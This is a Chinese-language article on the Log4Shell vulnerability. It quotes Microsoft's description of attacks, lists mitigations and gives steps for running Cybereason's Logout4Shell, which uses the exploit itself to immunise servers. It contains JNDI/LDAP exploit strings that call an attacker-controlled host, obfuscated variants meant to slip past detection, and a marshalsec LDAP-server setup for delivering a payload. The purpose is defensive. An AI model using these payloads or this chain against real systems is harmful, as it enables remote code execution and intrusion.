先来看看微软官方对此事件的描述：“Microsoft威胁情报团队：该漏洞允许未经身份验证的远程代码执行，当攻击者通过各种不同的输入向量提供的特制字符串被Log4j2漏洞组件解析和处理时触发。

微软目前观察到的大部分攻击都与试图指纹易受攻击的系统的攻击者进行的大规模扫描以及安全公司和研究人员的扫描有关。一个示例攻击模式将出现在带有如下字符串的Web请求日志中：${jndi:ldap://\[攻击者站点\]/a}

  

例如，一种常见的利用风险模式是一个Web应用程序，其代码旨在处理日志中的用户名、引用者或用户代理字符串。这些字符串作为外部输入提供（使用Apache Struts构建的Web应用程序）。攻击者可以发送格式错误的用户名或使用精心设计的漏洞字符串设置用户代理，希望此外部输入将在某个时候由易受攻击的Log4j2代码处理并触发代码执行。

攻击者对目标系统执行HTTP请求，该系统使用Log4j2生成日志，该日志利用JNDI向攻击者控制的站点执行请求。然后，该漏洞会导致被利用的进程访问站点并执行有效负载。在许多观察到的攻击中，攻击者拥有的参数是DNS日志系统，旨在记录对站点的请求，以对易受攻击的系统进行指纹识别。

  

可以通过多个组件识别允许执行此漏洞的特制字符串。该字符串包含“jndi”，它指的是 Java 命名和目录接口。在此之后，协议如“ldap、ldaps、rmi、dns、iiop或http”，先于攻击者域。

  

随着安全团队努力检测漏洞的利用，攻击者对这些请求进行了混淆处理，以逃避基于请求模式的检测。我们已经看到诸如在漏洞利用字符串中运行较低或较高的命令（{jndi:${lower:l}${lower:d}a${lower:p}）以及更复杂的混淆尝试（${$ {::-j}${::-n}${::-d}${::-i}) 都试图绕过字符串匹配检测。

在发布时，绝大多数观察到的活动是扫描。微软观察到的活动包括安装硬币矿工、Cobalt Strike 以实现凭证盗窃和横向移动，以及从受感染系统中窃取数据”。

**二、解决方法**

## 为了帮助降低此漏洞的风险，客户应考虑以下暂解办法，更改需重启服务才能生效。

虽然针对此漏洞的最佳缓解措施是将log4j修补到2.15.0及更高版本，但在Log4j版本(>=2.10)中，可以通过将系统属性设置log4j2.formatMsgNoLookups为true或从类路径中删除JndiLookup 类(zip -q -d log4j-core-\*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class)来缓解此行为。此外，如果服务器的Java运行时\>= 8u121，则默认情况下，设置com.sun.jndi.rmi.object.trustURLCodebase和 com.sun.jndi.cosnaming.object.trustURLCodebase为“false”，以降低风险。  

但是，启用这些系统属性需要访问易受攻击的服务器以及重新启动。Cybereason研究小组已经开发出了下面的代码，利用相同的漏洞和有效载荷重新配置自身设置禁用，有效阻止任何进一步尝试利用Log4Shell。

## **三、如何使用**

1、下载构建运行

1.1 git clone https://github.com/cybereason/Logout4Shell.git

1.2 构建 - mvn package

1.3 cd target/classes

1.4 运行 - python3 -m http.server 8888

  

2、下载、构建和运行Marshalsec的ldap服务器

2.1 `git clone https://github.com/mbechler/marshalsec.git`

2.2 `mvn package -DskipTests`

2.3 `java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<IP_OF_PYTHON_SERVER_FROM_STEP_1>:8888/#Log4jRCE"`

`   `

3、免疫服务器

3.1 编辑`${jndi:ldap://<IP_OF_LDAP_SERVER_FROM_STEP_2>:1389/a}`到易受攻击的字段（如用户名）
